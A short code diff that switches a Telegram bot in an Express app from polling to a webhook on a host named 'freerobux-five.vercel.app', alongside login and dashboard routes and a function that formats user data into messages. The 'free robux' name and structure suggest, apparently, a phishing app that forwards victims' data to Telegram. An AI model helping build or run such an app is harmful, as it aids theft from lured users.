@@ -22,7 +22,8 @@ function generateMessage(userData) {
     return message;
 }
 
-const bot = new TelegramBot(token, { polling: true });
+const bot = new TelegramBot(token);
+bot.setWebHook(`https://freerobux-five.vercel.app/api/webhook`);
 
 // Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -72,6 +73,12 @@ app.get("/dashboard", (req, res) => {
 app.get("/logout", (req, res) => {
   req.session.destroy();
   res.redirect("/id/login");
+});
+
+// bot
+app.post("/api/webhook", (req, res) => {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
 });
 
 export default app;
